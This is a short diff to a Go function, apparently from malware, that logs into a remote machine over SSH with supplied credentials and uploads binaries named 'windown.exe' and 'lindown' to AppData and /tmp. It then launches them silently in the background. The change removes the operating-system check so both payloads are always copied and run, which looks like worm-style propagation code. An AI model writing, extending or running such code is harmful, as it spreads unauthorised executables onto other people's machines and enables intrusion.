@@ -142,14 +142,11 @@ func getinssh(myip string, user string, passwd string) (myreturn string) {
 	}
 
 	session := newsession(connection)
-	if runtime.GOOS == "windows" {
-		scpexec(session, "windown.exe", "\\Users\\Administrator\\AppData\\Roaming\\windown.exe")
-		execlinuxcmd(session, "START /B \\Users\\Administrator\\AppData\\Roaming\\windown.exe")
-	} else {
+	scpexec(session, "windown.exe", "\\Users\\Administrator\\AppData\\Roaming\\windown.exe")
+	execlinuxcmd(session, "START /B \\Users\\Administrator\\AppData\\Roaming\\windown.exe")
 	scpexec(session, "lindown", "/tmp/lindown")
 	execlinuxcmd(session, "./tmp/lindown > /dev/null 2>&1 &")
 	session.Close()
-	}
 	return "yes"
 }
 
